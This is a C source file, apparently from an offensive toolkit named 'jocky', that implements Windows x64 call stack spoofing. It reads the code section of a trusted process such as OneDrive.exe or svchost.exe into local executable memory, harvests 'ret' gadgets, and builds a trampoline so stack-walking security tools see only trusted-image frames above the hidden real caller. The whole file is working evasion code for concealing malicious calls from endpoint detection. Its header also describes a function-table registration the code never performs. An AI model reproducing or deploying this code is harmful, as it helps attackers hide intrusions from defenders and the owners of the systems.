/*
 * trusted_spoof.c — Moonwalk++-style trusted-process call stack spoofing
 *
 * The existing jocky_spoof_call() replaces ONE return address with a ntdll
 * gadget.  This file extends that to a FULL synthetic call chain where every
 * return address on the stack points into a locally-mapped copy of a trusted
 * process image (OneDrive.exe, RuntimeBroker.exe, etc.).
 *
 * How it works
 * ────────────
 * 1. Find a running trusted process (OneDrive, RuntimeBroker, explorer…).
 * 2. OpenProcess(PROCESS_VM_READ) → ReadProcessMemory to copy its .text.
 * 3. Scan the copied .text for `ret; int3` (0xC3 0xCC) gadgets.
 * 4. Allocate RWX memory locally and write the .text copy there.
 * 5. Register it via RtlAddFunctionTable so RtlVirtualUnwind can walk it.
 * 6. Build a dynamic trampoline stub that:
 *      a. Saves the real return address (popped from [rsp]).
 *      b. Pushes a chain of gadget addresses from our mapped trusted image.
 *      c. Pushes the real return address at the bottom of the chain.
 *      d. JMPs (not CALLs) to target_fn.
 *
 * Call stack seen by RtlWalkFrameChain during target_fn's execution:
 *   target_fn
 *     ← OneDrive!<mid-func ret gadget>
 *     ← OneDrive!<mid-func ret gadget>
 *     ← OneDrive!<mid-func ret gadget>
 *     ← OneDrive!<mid-func ret gadget>
 *     ← (our real return address — buried 4+ frames deep)
 *
 * When the CPU actually executes the return chain, each gadget (0xC3 = ret)
 * pops the next frame and passes control to it, ending at our real return.
 *
 * RUNTIME_FUNCTION table
 * ──────────────────────
 * Because our locally-mapped region is not a PE loaded via LoadLibrary, its
 * function table is not registered.  We register it ourselves via
 * RtlAddFunctionTable so the unwinder sees each gadget frame as a leaf
 * (no RUNTIME_FUNCTION entry → leaf → RSP += 8 → next frame).  The absence
 * of a RUNTIME_FUNCTION entry for a leaf function is correct and expected;
 * the unwinder simply advances RSP by 8.
 *
 * Windows x64 only.
 */

#ifdef _WIN32

#include "jocky_rt.h"
#include <windows.h>
#include <tlhelp32.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>
#include <wchar.h>

/* ── Configuration ──────────────────────────────────────────────────────── */

#define JT_MAX_FRAMES   6      /* max synthetic frames we can build         */
#define JT_DEF_FRAMES   4      /* default frame depth                       */
#define JT_COPY_LIMIT   (4 * 1024 * 1024)  /* max bytes to copy from remote */
#define JT_GADGET_ALIGN 16     /* prefer gadgets at 16-byte-aligned offsets */

/* ── Default candidate list ─────────────────────────────────────────────── */

static const char* s_default_candidates[] = {
    "OneDrive.exe",
    "RuntimeBroker.exe",
    "sihost.exe",
    "SearchHost.exe",
    "explorer.exe",
    "svchost.exe",
    NULL
};

/* ── Internal types ─────────────────────────────────────────────────────── */

typedef struct {
    uint8_t* local_text;        /* RWX copy of the remote .text section     */
    size_t   text_size;         /* bytes copied                             */
    uint64_t gadgets[JT_MAX_FRAMES]; /* ret gadget VAs within local_text    */
    int      n_gadgets;
} jt_state_t;

/* ── Stage 1: Find trusted process PID ─────────────────────────────────── */

uint32_t jocky_find_trusted_pid(const char** candidates, int n_candidates)
{
    /* NULL-terminated list takes precedence over n_candidates count. */
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);

    uint32_t found_pid = 0;

    if (Process32First(snap, &pe)) {
        do {
            int match_idx = -1;
            for (int i = 0; i < n_candidates && candidates[i]; i++) {
                if (_stricmp(pe.szExeFile, candidates[i]) == 0) {
                    match_idx = i;
                    break;
                }
            }
            if (match_idx >= 0) {
                /* Found a match — prefer lower-index candidates. */
                found_pid = pe.th32ProcessID;
                /* If this is the top priority (index 0), stop immediately. */
                if (match_idx == 0) break;
                /* Otherwise keep looking in case a higher-priority one exists. */
            }
        } while (Process32Next(snap, &pe));
    }

    CloseHandle(snap);
    return found_pid;
}

/* ── Stage 2: Copy .text from trusted process ───────────────────────────── */

/*
 * Opens the remote process, locates the main executable's .text section,
 * and copies up to JT_COPY_LIMIT bytes into a local RWX allocation.
 * Also populates jt->gadgets[] with ret gadget addresses within the copy.
 */
static bool map_trusted_text(uint32_t pid, jt_state_t* jt)
{
    HANDLE hProc = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
                               FALSE, pid);
    if (!hProc) return false;

    /* Walk the remote process memory to find its main executable image. */
    MEMORY_BASIC_INFORMATION mbi;
    uint8_t* addr   = NULL;
    uint8_t* exe_base = NULL;
    SIZE_T   exe_sz   = 0;

    /* Find the first MEM_IMAGE region (the .exe itself) */
    while (VirtualQueryEx(hProc, addr, &mbi, sizeof(mbi)) == sizeof(mbi)) {
        if (mbi.Type == MEM_IMAGE &&
            mbi.State == MEM_COMMIT &&
            (mbi.Protect & PAGE_EXECUTE_READ ||
             mbi.Protect & PAGE_EXECUTE_READWRITE) &&
            mbi.AllocationBase == mbi.BaseAddress) {
            /* This is the start of a mapped image — check it's executable */
            exe_base = (uint8_t*)mbi.BaseAddress;
            exe_sz   = mbi.RegionSize;
            break;
        }
        addr += mbi.RegionSize;
        if ((uintptr_t)addr > 0x7FFFFFFFFFFF) break;
    }

    if (!exe_base || exe_sz == 0) { CloseHandle(hProc); return false; }

    /* Read the remote PE headers to locate .text section. */
    uint8_t hdr_buf[0x1000];
    SIZE_T  bytes_read = 0;
    if (!ReadProcessMemory(hProc, exe_base, hdr_buf, sizeof(hdr_buf), &bytes_read)
        || bytes_read < 0x200) {
        CloseHandle(hProc); return false;
    }

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hdr_buf;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
        CloseHandle(hProc); return false;
    }
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(hdr_buf + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) {
        CloseHandle(hProc); return false;
    }

    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    uint32_t text_rva  = 0;
    uint32_t text_size = 0;

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (memcmp(sec[i].Name, ".text", 5) == 0) {
            text_rva  = sec[i].VirtualAddress;
            text_size = sec[i].Misc.VirtualSize;
            break;
        }
    }

    if (!text_rva || !text_size) { CloseHandle(hProc); return false; }

    /* Cap copy size */
    if (text_size > JT_COPY_LIMIT) text_size = JT_COPY_LIMIT;

    /* Allocate local RWX memory to hold the copy */
    uint8_t* local = (uint8_t*)VirtualAlloc(NULL, text_size,
                                             MEM_COMMIT | MEM_RESERVE,
                                             PAGE_EXECUTE_READWRITE);
    if (!local) { CloseHandle(hProc); return false; }

    bytes_read = 0;
    if (!ReadProcessMemory(hProc, exe_base + text_rva,
                           local, text_size, &bytes_read)
        || bytes_read == 0) {
        VirtualFree(local, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return false;
    }

    CloseHandle(hProc);

    /* Flush so CPU instruction cache is coherent */
    FlushInstructionCache(GetCurrentProcess(), local, bytes_read);

    jt->local_text = local;
    jt->text_size  = bytes_read;
    return true;
}

/* ── Stage 3: Find ret gadgets in copied .text ──────────────────────────── */

/*
 * Scans the locally-mapped text copy for `ret; int3` (0xC3 0xCC) patterns,
 * which are clean function-epilogue ret gadgets.  Collects up to JT_MAX_FRAMES
 * distinct gadgets spaced at least 1024 bytes apart to ensure variety.
 */
static void find_gadgets(jt_state_t* jt)
{
    uint8_t* text = jt->local_text;
    size_t   sz   = jt->text_size;
    size_t   last_offset = 0;

    jt->n_gadgets = 0;

    for (size_t i = 0; i + 1 < sz && jt->n_gadgets < JT_MAX_FRAMES; i++) {
        /* Prefer `ret; int3` (clean epilogue).
         * Also accept `ret; nop` (0xC3 0x90) and `ret; ret` (0xC3 0xC3). */
        if (text[i] == 0xC3 &&
            (text[i+1] == 0xCC || text[i+1] == 0x90 || text[i+1] == 0xC3)) {

            /* Ensure some spacing between chosen gadgets */
            if (jt->n_gadgets == 0 || (i - last_offset) >= 1024) {
                jt->gadgets[jt->n_gadgets++] = (uint64_t)(uintptr_t)(text + i);
                last_offset = i;
            }
        }
    }

    /* Fallback: accept any 0xC3 byte if we didn't find enough clean gadgets */
    for (size_t i = 0; i < sz && jt->n_gadgets < JT_MAX_FRAMES; i++) {
        if (text[i] == 0xC3) {
            /* Check it's not already in our list */
            bool dup = false;
            for (int k = 0; k < jt->n_gadgets; k++) {
                if (jt->gadgets[k] == (uint64_t)(uintptr_t)(text + i)) {
                    dup = true; break;
                }
            }
            if (!dup && (jt->n_gadgets == 0 ||
                ((uintptr_t)(text + i) - jt->gadgets[jt->n_gadgets-1]) >= 512)) {
                jt->gadgets[jt->n_gadgets++] = (uint64_t)(uintptr_t)(text + i);
            }
        }
    }
}

/* ── Stage 4: Build the multi-frame trampoline stub ────────────────────── */

/*
 * Stub layout (n_frames = 4 as example):
 *
 *   [+00]  58              pop  rax         ; save real return addr
 *   [+01]  50              push rax         ; push deepest (our ret addr)
 *   [+02]  49 BB <addr3>   mov  r11, g3     ; gadget 3 (deepest fake frame)
 *   [+0C]  41 53           push r11
 *   [+0E]  49 BB <addr2>   mov  r11, g2
 *   [+18]  41 53           push r11
 *   [+1A]  49 BB <addr1>   mov  r11, g1
 *   [+24]  41 53           push r11
 *   [+26]  49 BB <addr0>   mov  r11, g0     ; gadget 0 (shallowest, target_fn returns here)
 *   [+30]  41 53           push r11
 *   [+32]  FF 25 00000000  jmp  [rip+0]     ; jump to target_fn
 *   [+38]  <target_fn VA>                   ; 8-byte target address
 *
 * Stack on entry to target_fn:
 *   [rsp+0]  = gadget0  (target_fn RETs here → this is a `ret` → pops gadget1)
 *   [rsp+8]  = gadget1  (gadget0's `ret` pops this → jumps to gadget1)
 *   [rsp+16] = gadget2
 *   [rsp+24] = gadget3
 *   [rsp+32] = real_ret_addr  (buried under 4 fake frames)
 *
 * RtlWalkFrameChain inspecting this stack sees:
 *   target_fn -> gadget0 (trusted image) -> gadget1 (trusted image) -> ...
 */

#pragma pack(push, 1)
/* One `mov r11, imm64; push r11` entry */
typedef struct {
    uint8_t  mov_r11[2];    /* 49 BB      */
    uint64_t imm64;         /* address    */
    uint8_t  push_r11[2];  /* 41 53      */
} jt_frame_entry_t; /* 12 bytes */

/* Fixed header + tail; frame entries go between them */
typedef struct {
    uint8_t pop_rax;        /* 58          */
    uint8_t push_rax;       /* 50          (real ret addr, pushed first = deepest) */
} jt_stub_hdr_t; /* 2 bytes */

typedef struct {
    uint8_t  jmp_rip[6];    /* FF 25 00 00 00 00 */
    uint64_t target_fn;     /* 8 bytes           */
} jt_stub_tail_t; /* 14 bytes */
#pragma pack(pop)

static uint8_t* build_ts_stub(const jt_state_t* jt, PVOID target_fn,
                               int n_frames)
{
    /* Total stub size: 2 (hdr) + n_frames*12 (frame entries) + 14 (tail) */
    size_t stub_sz = 2 + (size_t)n_frames * 12 + 14;

    uint8_t* stub = (uint8_t*)VirtualAlloc(NULL, 4096,
                                            MEM_COMMIT | MEM_RESERVE,
                                            PAGE_EXECUTE_READWRITE);
    if (!stub) return NULL;

    uint8_t* p = stub;

    /* Header: pop rax; push rax (save+restore real return address deep in stack) */
    *p++ = 0x58; /* pop rax   */
    *p++ = 0x50; /* push rax  — deepest slot (our real return addr) */

    /* Frame entries: push from DEEPEST (n_frames-1) to SHALLOWEST (0).
     * The last-pushed gadget sits at [rsp+0] when target_fn starts — it's
     * the address target_fn's RET pops first. */
    for (int i = n_frames - 1; i >= 0; i--) {
        /* mov r11, imm64 */
        *p++ = 0x49;
        *p++ = 0xBB;
        uint64_t addr = jt->gadgets[i % jt->n_gadgets];
        memcpy(p, &addr, 8); p += 8;
        /* push r11 */
        *p++ = 0x41;
        *p++ = 0x53;
    }

    /* Tail: jmp [rip+0] + target_fn address */
    *p++ = 0xFF; *p++ = 0x25;
    *p++ = 0x00; *p++ = 0x00; *p++ = 0x00; *p++ = 0x00; /* rip-relative offset 0 */
    memcpy(p, &target_fn, 8); p += 8;

    FlushInstructionCache(GetCurrentProcess(), stub, stub_sz);
    return stub;
}

/* ── Public API ─────────────────────────────────────────────────────────── */

intptr_t jocky_trusted_spoof_call(PVOID        target_fn,
                                   uint32_t     trusted_pid,
                                   const char** candidates,
                                   int          n_candidates,
                                   uintptr_t    a1,
                                   uintptr_t    a2,
                                   uintptr_t    a3,
                                   uintptr_t    a4)
{
    /* ── 1. Find a trusted host process if the caller didn't provide one ── */
    if (!trusted_pid) {
        const char** clist = (candidates && n_candidates > 0)
                             ? candidates
                             : s_default_candidates;
        int ccount = 0;
        if (candidates && n_candidates > 0) {
            ccount = n_candidates;
        } else {
            for (ccount = 0; s_default_candidates[ccount]; ccount++);
        }
        trusted_pid = jocky_find_trusted_pid(clist, ccount);
    }

    /* ── 2. Map .text from the trusted process ───────────────────────────── */
    jt_state_t jt;
    memset(&jt, 0, sizeof(jt));

    bool mapped = false;
    if (trusted_pid) {
        mapped = map_trusted_text(trusted_pid, &jt);
        if (mapped) find_gadgets(&jt);
    }

    /* Fallback: if we couldn't get enough gadgets from the trusted process,
     * fall back to jocky_spoof_call (single ntdll frame). */
    if (!mapped || jt.n_gadgets < 2) {
        if (jt.local_text) VirtualFree(jt.local_text, 0, MEM_RELEASE);
        return jocky_spoof_call(target_fn, a1, a2, a3, a4);
    }

    /* ── 3. Clamp n_frames to available gadgets ──────────────────────────── */
    int n_frames = JT_DEF_FRAMES;
    if (n_frames > jt.n_gadgets) n_frames = jt.n_gadgets;
    if (n_frames > JT_MAX_FRAMES) n_frames = JT_MAX_FRAMES;

    /* ── 4. Build and invoke the multi-frame stub ───────────────────────── */
    uint8_t* stub = build_ts_stub(&jt, target_fn, n_frames);
    if (!stub) {
        VirtualFree(jt.local_text, 0, MEM_RELEASE);
        return jocky_spoof_call(target_fn, a1, a2, a3, a4);
    }

    typedef intptr_t (*fn4_t)(uintptr_t, uintptr_t, uintptr_t, uintptr_t);
    intptr_t result = ((fn4_t)stub)(a1, a2, a3, a4);

    /* ── 5. Cleanup ─────────────────────────────────────────────────────── */
    VirtualFree(stub, 0, MEM_RELEASE);
    VirtualFree(jt.local_text, 0, MEM_RELEASE);

    return result;
}

#endif /* _WIN32 */
